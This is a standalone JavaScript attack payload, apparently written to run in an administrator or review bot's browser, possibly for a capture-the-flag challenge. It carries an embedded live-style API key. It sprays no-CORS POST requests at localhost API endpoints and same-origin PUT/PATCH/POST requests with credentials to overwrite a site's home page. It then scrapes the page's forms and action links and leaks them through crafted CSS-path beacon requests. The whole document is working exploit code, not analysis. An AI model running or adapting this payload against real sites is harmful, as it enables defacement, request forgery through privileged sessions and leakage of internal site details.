(async () => {
  const T = "VTG918";
  const K = "vk_live_daf5f1744a7bfbbeefe31e1544ca1d4ee214";
  const SEIZED_B64 = "";
  const S = decodeURIComponent(escape(atob(SEIZED_B64)));

  const bc = async (k) => { try { await fetch('/account.php/'+T+'_'+k+'.css',{credentials:'include',cache:'no-store'}); } catch(e){} };
  const chk = async () => { try { return (await (await fetch('/?_nc='+Date.now(),{cache:'no-store'})).text()).includes('CT-CASE'); } catch(e){ return false; } };

  await bc('A');

  // Phase 1: ALL localhost POST in parallel (simple requests - no CORS preflight needed)
  const kq = '?api_key='+K;
  const tp = {method:'POST',headers:{'Content-Type':'text/plain'},mode:'no-cors',cache:'no-store'};
  const fu = {method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},mode:'no-cors',cache:'no-store'};

  await Promise.allSettled([
    // text/plain + JSON body (PHP reads via php://input + json_decode)
    fetch('http://127.0.0.1/api/pages/home'+kq, {...tp, body:JSON.stringify({body:S})}),
    fetch('http://127.0.0.1/api/pages/home'+kq, {...tp, body:JSON.stringify({content:S})}),
    fetch('http://127.0.0.1/api/pages'+kq,      {...tp, body:JSON.stringify({slug:'home',body:S})}),
    fetch('http://127.0.0.1/api/page/home'+kq,  {...tp, body:JSON.stringify({body:S})}),
    fetch('http://127.0.0.1/api/v1/pages/home'+kq, {...tp, body:JSON.stringify({body:S})}),
    // form-urlencoded (PHP reads via $_POST)
    fetch('http://127.0.0.1/api/pages/home'+kq, {...fu, body:'slug=home&body='+encodeURIComponent(S)}),
    fetch('http://127.0.0.1/api/pages'+kq,      {...fu, body:'slug=home&body='+encodeURIComponent(S)}),
    // raw HTML body
    fetch('http://127.0.0.1/api/pages/home'+kq, {...tp, body:S}),
  ]);

  await bc('L0');
  if (await chk()) { await bc('WIN_L'); return; }

  // Phase 2: Same-origin (bot's IP might be allowed)
  await Promise.allSettled([
    fetch('/api/pages/home'+kq, {method:'PUT',  headers:{'Content-Type':'application/json'}, body:JSON.stringify({body:S}), credentials:'include', cache:'no-store'}),
    fetch('/api/pages/home'+kq, {method:'PATCH',headers:{'Content-Type':'application/json'}, body:JSON.stringify({body:S}), credentials:'include', cache:'no-store'}),
    fetch('/api/pages/home'+kq, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({body:S}), credentials:'include', cache:'no-store'}),
    fetch('/api/pages'+kq,      {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({slug:'home',body:S}), credentials:'include', cache:'no-store'}),
  ]);

  await bc('SO0');
  if (await chk()) { await bc('WIN_SO'); return; }

  // Phase 3: Explore review page for hidden forms/actions
  try {
    const html = await (await fetch(location.href, {credentials:'include', cache:'no-store'})).text();
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const forms = [...doc.querySelectorAll('form')];
    await bc('FORMS_'+forms.length);
    for (let i=0; i<forms.length; i++) {
      const act = (forms[i].getAttribute('action')||'').replace(/[^a-zA-Z0-9_\-\/]/g,'').slice(0,25);
      const names = [...forms[i].querySelectorAll('[name]')].map(el=>el.getAttribute('name')).join('_').slice(0,25);
      await bc('F'+i+'_'+act.replace(/\//g,'_')+'__'+names);
    }
    // Beacon all link hrefs that look like actions
    const links = [...doc.querySelectorAll('a[href]')]
      .map(a=>a.getAttribute('href'))
      .filter(h=>h&&(h.includes('api')||h.includes('seize')||h.includes('action')||h.includes('case')));
    for (const lnk of links.slice(0,5)) {
      await bc('LNK_'+lnk.replace(/[^a-zA-Z0-9_\-\/]/g,'').slice(0,30));
    }
  } catch(e) { await bc('ERR_'+String(e).slice(0,20).replace(/[^a-zA-Z0-9]/g,'_')); }

  await bc('DONE');
})();
